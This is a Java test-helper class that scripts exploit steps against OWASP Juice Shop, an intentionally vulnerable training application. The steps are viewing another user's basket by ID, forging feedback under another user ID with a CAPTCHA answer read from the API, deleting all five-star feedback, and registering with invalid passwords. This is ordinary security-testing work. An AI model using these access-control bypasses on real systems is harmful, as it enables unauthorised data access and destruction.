
package utilities.JuiceShop;

import org.openqa.selenium.json.Json;

import java.io.IOException;
import java.net.http.HttpResponse;
import java.util.List;
import java.util.Map;

/** API-level actions for Juice Shop challenge scenarios. HTTP transport remains in JuiceShopApi. */
public final class JuiceShopChallengeActions {

    private final JuiceShopApi api;
    private final Json json = new Json();

    public record BasketAttempt(int ownBasketId, int targetBasketId, HttpResponse<String> response) {}
    public record FeedbackAttempt(int authenticatedUserId, int forgedUserId, HttpResponse<String> response) {}
    public record FeedbackRemoval(int deletedCount, HttpResponse<String> response, boolean fiveStarsRemain) {}

    public JuiceShopChallengeActions(JuiceShopApi api) {
        this.api = api;
    }

    public HttpResponse<String> registerWithMismatchedPasswords() throws IOException, InterruptedException {
        String email = "registration-" + System.nanoTime() + "@example.com";
        return api.post("/api/Users/", Map.of("email", email, "password", "Password123!", "passwordRepeat", "Different123!"));
    }

    public HttpResponse<String> registerEmptyUser() throws IOException, InterruptedException {
        return api.post("/api/Users/", Map.of("email", "", "password", "", "passwordRepeat", ""));
    }

    public BasketAttempt viewAnotherBasket() throws IOException, InterruptedException {
        var session = api.login();
        int targetBasketId = session.basketId() == 1 ? 2 : 1;
        var response = api.get("/rest/basket/" + targetBasketId, session.token());
        return new BasketAttempt(session.basketId(), targetBasketId, response);
    }

    @SuppressWarnings("unchecked")
    public FeedbackAttempt submitForgedFeedback() throws IOException, InterruptedException {
        var session = api.login();
        var captchaResponse = api.get("/rest/captcha/");
        if (captchaResponse.statusCode() != 200) {
            throw new IllegalStateException("CAPTCHA request failed. HTTP " + captchaResponse.statusCode());
        }

        Map<String, Object> captcha = json.toType(captchaResponse.body(), Map.class);
        int captchaId = ((Number) captcha.get("captchaId")).intValue();
        String answer = captcha.get("answer").toString();
        int forgedUserId = session.userId() == 1 ? 2 : 1;

        Map<String, Object> payload = Map.of("UserId", forgedUserId,
                "comment", "Automated authorization test", "rating", 1,
                "captchaId", captchaId, "captcha", answer);

        var response = api.post("/api/Feedbacks/", payload, session.token());
        return new FeedbackAttempt(session.userId(), forgedUserId, response);
    }

    public FeedbackRemoval removeFiveStarFeedback() throws IOException, InterruptedException {
        var session = api.login();
        var initial = api.get("/api/Feedbacks/", session.token());
        if (initial.statusCode() != 200) {
            throw new IllegalStateException("Could not retrieve feedback. HTTP " + initial.statusCode());
        }

        List<Map<String, Object>> feedbacks = api.getFeedbackRecords(initial.body());
        int removed = 0;
        for (Map<String, Object> feedback : feedbacks) {
            if (((Number) feedback.get("rating")).intValue() != 5) continue;

            int id = ((Number) feedback.get("id")).intValue();
            var deletion = api.delete("/api/Feedbacks/" + id, session.token());
            if (deletion.statusCode() != 200 && deletion.statusCode() != 204) {
                throw new IllegalStateException("Failed to delete feedback ID " + id + ". HTTP " + deletion.statusCode());
            }
            removed++;
            System.out.println("[FIVE-STAR FEEDBACK] Deleted feedback ID: " + id);
        }

        var remaining = api.get("/api/Feedbacks/", session.token());
        if (remaining.statusCode() != 200) {
            throw new IllegalStateException("Could not verify remaining feedback. HTTP " + remaining.statusCode());
        }
        boolean fiveStarsRemain = api.getFeedbackRecords(remaining.body()).stream()
                .anyMatch(feedback -> ((Number) feedback.get("rating")).intValue() == 5);
        return new FeedbackRemoval(removed, remaining, fiveStarsRemain);
    }
}
